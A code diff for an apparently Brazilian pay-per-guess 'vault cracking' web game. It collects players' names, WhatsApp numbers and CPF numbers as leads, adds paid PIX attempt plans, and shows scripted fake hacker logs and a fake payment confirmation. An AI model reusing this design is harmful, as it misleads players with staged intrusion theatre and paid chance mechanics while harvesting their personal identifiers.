@@ -35,7 +35,11 @@
         }
         .log-line { margin-bottom: 2px; overflow: hidden; white-space: nowrap; animation: typing 0.5s steps(40, end); }
         @keyframes typing { from { width: 0 } to { width: 100% } }
-        .modal-backdrop { background-color: rgba(0, 0, 0, 0.85); backdrop-filter: blur(5px); }
+        .modal-backdrop { background-color: rgba(0, 0, 0, 0.85); backdrop-filter: blur(8px); }
+        
+        /* Destaque para o plano recomendado */
+        .plan-card:hover { transform: translateY(-5px); border-color: #eab308; }
+        .best-value { border: 2px solid #eab308; background: rgba(234, 179, 8, 0.1); }
     </style>
 </head>
 <body class="text-white flex flex-col items-center justify-center min-h-screen p-4 overflow-hidden">
@@ -98,8 +102,57 @@
                 <div class="mb-4 text-left"><label class="text-xs text-slate-500 font-bold ml-1">NOME COMPLETO</label><input type="text" id="input-nome" required class="w-full bg-slate-800 border border-slate-600 rounded-lg p-3 text-white outline-none focus:border-yellow-500"></div>
                 <div class="mb-4 text-left"><label class="text-xs text-slate-500 font-bold ml-1">WHATSAPP</label><input type="tel" id="input-tel" required class="w-full bg-slate-800 border border-slate-600 rounded-lg p-3 text-white outline-none focus:border-yellow-500" placeholder="(11) 99999-9999"></div>
                 <div class="mb-6 text-left"><label class="text-xs text-slate-500 font-bold ml-1">CPF (Chave Pix)</label><input type="text" id="input-cpf" required class="w-full bg-slate-800 border border-slate-600 rounded-lg p-3 text-white outline-none focus:border-yellow-500" placeholder="000.000.000-00"></div>
-                <button type="submit" class="w-full bg-green-600 hover:bg-green-500 text-white font-bold py-3 rounded-xl transition-all">CONFIRMAR IDENTIDADE</button>
+                <button type="submit" class="w-full bg-green-600 hover:bg-green-500 text-white font-bold py-3 rounded-xl transition-all">SALVAR E CONTINUAR</button>
             </form>
+        </div>
+    </div>
+
+    <div id="modal-planos" class="fixed inset-0 modal-backdrop z-[70] hidden flex items-center justify-center p-4">
+        <div class="bg-slate-900 border border-slate-700 p-6 rounded-3xl w-full max-w-sm relative shadow-2xl">
+            <button onclick="fecharModal('modal-planos')" class="absolute top-4 right-4 text-slate-500 hover:text-white">✕</button>
+            
+            <div class="text-center mb-6">
+                <h3 class="text-2xl font-black text-white italic">ESCOLHA SEU PLANO</h3>
+                <p class="text-slate-400 text-xs">Quanto mais chances, maior a probabilidade de abrir.</p>
+            </div>
+
+            <div class="space-y-3">
+                <div onclick="selecionarPlano(0.50, 1)" class="plan-card cursor-pointer bg-slate-800 border border-slate-600 p-4 rounded-xl flex justify-between items-center transition-all hover:bg-slate-700">
+                    <div>
+                        <div class="font-bold text-white">TENTATIVA ÚNICA</div>
+                        <div class="text-xs text-slate-400">Teste sua sorte agora</div>
+                    </div>
+                    <div class="text-right">
+                        <div class="text-xl font-black text-yellow-500">R$ 0,50</div>
+                        <div class="text-[0.6rem] text-slate-500">1 chance</div>
+                    </div>
+                </div>
+
+                <div onclick="selecionarPlano(2.00, 5)" class="plan-card best-value cursor-pointer bg-slate-800/80 p-4 rounded-xl flex justify-between items-center transition-all relative overflow-hidden">
+                    <div class="absolute top-0 left-0 bg-yellow-500 text-black text-[0.6rem] font-bold px-2 py-0.5 rounded-br-lg">MAIS VENDIDO</div>
+                    <div>
+                        <div class="font-bold text-white mt-1">COMBO ESTRATÉGIA</div>
+                        <div class="text-xs text-green-400">Você economiza 20%</div>
+                    </div>
+                    <div class="text-right">
+                        <div class="text-2xl font-black text-yellow-400">R$ 2,00</div>
+                        <div class="text-[0.6rem] text-slate-400">5 chances (R$ 0,40/cada)</div>
+                    </div>
+                </div>
+
+                <div onclick="selecionarPlano(5.00, 15)" class="plan-card cursor-pointer bg-slate-800 border border-slate-600 p-4 rounded-xl flex justify-between items-center transition-all hover:bg-slate-700">
+                    <div>
+                        <div class="font-bold text-white">PACOTE MESTRE</div>
+                        <div class="text-xs text-green-400">Muitas chances de ganhar</div>
+                    </div>
+                    <div class="text-right">
+                        <div class="text-xl font-black text-yellow-500">R$ 5,00</div>
+                        <div class="text-[0.6rem] text-slate-500">15 chances (R$ 0,33/cada)</div>
+                    </div>
+                </div>
+            </div>
+
+            <p class="text-center text-[0.6rem] text-slate-500 mt-6">Pagamento via PIX Instantâneo</p>
         </div>
     </div>
 
@@ -114,19 +167,13 @@
     <script>
         document.getElementById('premio').innerText = (500.30).toLocaleString('pt-BR', { minimumFractionDigits: 2 });
         
-        // --- SONOPLASTIA ---
         const audioType = document.getElementById('sfx-type');
         const audioError = document.getElementById('sfx-error');
         const audioWin = document.getElementById('sfx-win');
-        
-        function playSound(sound) {
-            if(sound) { sound.currentTime = 0; sound.play().catch(e => console.log("Audio play blocked")); }
-        }
+        function playSound(sound) { if(sound) { sound.currentTime = 0; sound.play().catch(e => console.log("Audio play blocked")); }}
 
-        // --- MÁSCARAS ---
         $(document).ready(function(){ $('#input-tel').mask('(00) 00000-0000'); $('#input-cpf').mask('000.000.000-00'); });
         
-        // --- DADOS DO USUÁRIO ---
         let usuario = JSON.parse(localStorage.getItem('openpix_user')) || null;
         let historico = JSON.parse(localStorage.getItem('openpix_history')) || [];
 
@@ -137,19 +184,42 @@
                 setTimeout(() => senhaInput.parentElement.style.borderColor = "rgba(234, 179, 8, 0.3)", 500);
                 return;
             }
-            if (!usuario) { document.getElementById('modal-cadastro').classList.remove('hidden'); } 
-            else { iniciarHack(); }
+            if (!usuario) { 
+                document.getElementById('modal-cadastro').classList.remove('hidden'); 
+            } else { 
+                // AGORA ABRE OS PLANOS EM VEZ DE IR DIRETO
+                abrirPlanos(); 
+            }
         }
 
-        // --- VOZ DA IA ---
+        function abrirPlanos() {
+            document.getElementById('modal-planos').classList.remove('hidden');
+        }
+
+        function selecionarPlano(valor, chances) {
+            // Aqui entrará a integração do PIX no futuro
+            // Por enquanto, simula o pagamento aprovado
+            
+            fecharModal('modal-planos');
+            
+            // Simula um loading de pagamento rápido
+            const btnAcao = document.getElementById('btn-acao');
+            const btnTexto = document.getElementById('btn-texto');
+            btnAcao.disabled = true;
+            btnTexto.innerText = "AGUARDANDO PIX...";
+            
+            setTimeout(() => {
+                alert(`Simulação: Pagamento de R$ ${valor.toFixed(2)} recebido! Iniciando tentativa...`);
+                iniciarHack(); // Roda a tentativa
+            }, 1500);
+        }
+
         function falarBoasVindas(nomeCompleto) {
             if ('speechSynthesis' in window) {
                 const primeiroNome = nomeCompleto.split(' ')[0];
                 const msg = new SpeechSynthesisUtterance();
-                msg.text = `Seja bem vindo, ${primeiroNome}. Validando credenciais.`;
-                msg.lang = 'pt-BR';
-                msg.rate = 1.1; // Um pouco mais rápido
-                msg.pitch = 0.9; // Voz levemente mais grave
+                msg.text = `Seja bem vindo, ${primeiroNome}. Selecione seu plano de acesso.`;
+                msg.lang = 'pt-BR'; msg.rate = 1.1; msg.pitch = 0.9;
                 window.speechSynthesis.speak(msg);
             }
         }
@@ -163,23 +233,19 @@
             usuario = { nome, tel, cpf };
             localStorage.setItem('openpix_user', JSON.stringify(usuario));
             
-            // Envia para o servidor salvar no "Painel do Dono"
             fetch('/salvar-lead', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify(usuario)
-            }).catch(err => console.log("Erro ao salvar lead no server"));
+            }).catch(err => console.log("Erro ao salvar lead"));
 
             fecharModal('modal-cadastro');
-            
-            // A MÁGICA DA VOZ ACONTECE AQUI
             falarBoasVindas(nome);
-            iniciarHack();
+            abrirPlanos(); // Abre os planos logo após cadastrar
         }
 
         function fecharModal(id) { document.getElementById(id).classList.add('hidden'); }
 
-        // --- LÓGICA DO JOGO ---
         const terminal = document.getElementById('terminal');
         const btnAcao = document.getElementById('btn-acao');
         const btnTexto = document.getElementById('btn-texto');
@@ -187,34 +253,23 @@
         const delay = ms => new Promise(res => setTimeout(res, ms));
 
         async function adicionarLog(msg, cor = "#4ade80") {
-            // Toca som de digitação aleatoriamente para não ficar repetitivo
             if(Math.random() > 0.5) playSound(audioType);
-            
             const linha = document.createElement('div');
-            linha.className = 'log-line';
-            linha.style.color = cor;
-            linha.innerText = "> " + msg;
-            terminal.appendChild(linha);
-            terminal.scrollTop = terminal.scrollHeight;
+            linha.className = 'log-line'; linha.style.color = cor; linha.innerText = "> " + msg;
+            terminal.appendChild(linha); terminal.scrollTop = terminal.scrollHeight;
         }
 
         async function iniciarHack() {
             const senhaTentativa = senhaInput.value;
             btnAcao.disabled = true;
             btnTexto.innerText = "PROCESSANDO...";
-            terminal.classList.remove('hidden');
-            terminal.style.opacity = "1";
-            terminal.innerHTML = "";
+            terminal.classList.remove('hidden'); terminal.style.opacity = "1"; terminal.innerHTML = "";
             senhaInput.disabled = true;
 
-            await adicionarLog(`Usuário: ${usuario.cpf}`);
-            await delay(500);
-            await adicionarLog("Iniciando conexão segura...");
-            await delay(800);
-            await adicionarLog("Acessando Banco de Dados Central...");
-            await delay(1200);
-            await adicionarLog("Testando senha: " + senhaTentativa + "...");
-            await delay(1000);
+            await adicionarLog(`Usuário: ${usuario.cpf}`); await delay(500);
+            await adicionarLog("Pagamento Confirmado (Lote #9921)..."); await delay(800);
+            await adicionarLog("Acessando Banco de Dados Central..."); await delay(1200);
+            await adicionarLog("Testando senha: " + senhaTentativa + "..."); await delay(1000);
 
             try {
                 const res = await fetch('/tentar', {
@@ -223,52 +278,34 @@
                     body: JSON.stringify({ senha: senhaTentativa })
                 });
                 const data = await res.json();
-                
-                // Salva histórico
                 historico.push({ senha: senhaTentativa, ganhou: data.ganhou, data: new Date().toLocaleString('pt-BR') });
                 localStorage.setItem('openpix_history', JSON.stringify(historico));
 
                 if (data.ganhou) {
                     playSound(audioWin);
-                    await adicionarLog("ACESSO CONCEDIDO!", "#fbbf24");
-                    await delay(1000);
+                    await adicionarLog("ACESSO CONCEDIDO!", "#fbbf24"); await delay(1000);
                     alert(`💰 VOCÊ GANHOU R$ ${data.premio.toLocaleString('pt-BR', { minimumFractionDigits: 2 })}`);
                     location.reload();
                 } else {
                     playSound(audioError);
-                    await adicionarLog("ERRO: HASH INVÁLIDA.", "#ef4444");
-                    document.body.classList.add('shake'); // Animação de tremor (CSS precisa estar lá)
-                    await delay(1500);
-                    
+                    await adicionarLog("ERRO: SENHA INCORRETA.", "#ef4444");
+                    document.body.classList.add('shake'); await delay(1500);
                     document.body.classList.remove('shake');
-                    terminal.style.opacity = "0";
-                    setTimeout(() => terminal.classList.add('hidden'), 300);
-                    senhaInput.value = "";
-                    senhaInput.disabled = false;
-                    senhaInput.focus();
-                    btnAcao.disabled = false;
-                    btnTexto.innerText = "TENTAR NOVAMENTE";
+                    terminal.style.opacity = "0"; setTimeout(() => terminal.classList.add('hidden'), 300);
+                    senhaInput.value = ""; senhaInput.disabled = false; senhaInput.focus();
+                    btnAcao.disabled = false; btnTexto.innerText = "TENTAR NOVAMENTE";
                     document.getElementById('premio').innerText = data.novoPremio.toLocaleString('pt-BR', { minimumFractionDigits: 2 });
                 }
             } catch (error) {
-                console.error(error);
-                await adicionarLog("ERRO DE REDE", "red");
-                btnAcao.disabled = false;
+                console.error(error); await adicionarLog("ERRO DE REDE", "red"); btnAcao.disabled = false;
             }
         }
-
-        // Função do histórico (simplificada para caber)
         function abrirHistorico() {
-            const lista = document.getElementById('lista-historico');
-            lista.innerHTML = "";
+            const lista = document.getElementById('lista-historico'); lista.innerHTML = "";
             if (historico.length === 0) lista.innerHTML = '<div class="text-center text-slate-500 text-sm mt-10">Vazio.</div>';
-            else historico.slice().reverse().forEach(item => {
-                lista.innerHTML += `<div class="bg-slate-800 p-2 mb-2 rounded border border-slate-700 flex justify-between"><span class="text-white font-mono">${item.senha}</span><span class="${item.ganhou?'text-green-400':'text-red-400'} text-xs font-bold">${item.ganhou?'ABERTO':'ERRO'}</span></div>`;
-            });
+            else historico.slice().reverse().forEach(item => { lista.innerHTML += `<div class="bg-slate-800 p-2 mb-2 rounded border border-slate-700 flex justify-between"><span class="text-white font-mono">${item.senha}</span><span class="${item.ganhou?'text-green-400':'text-red-400'} text-xs font-bold">${item.ganhou?'ABERTO':'ERRO'}</span></div>`; });
             document.getElementById('modal-historico').classList.remove('hidden');
         }
-        
-        // CSS Style Injection (igual ao anterior)
         const styleSheet = document.createElement("style");
         styleSheet.innerText = `@keyframes shimmer { 0% { left: -100%; } 100% { left: 200%; } } .shake { animation: shake 0.5s; } @keyframes shake { 0%, 100% { transform: translateX(0); } 10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); } 20%, 40%, 60%, 80% { transform: translateX(5px); } }`;
         document.head.appendChild(styleSheet);
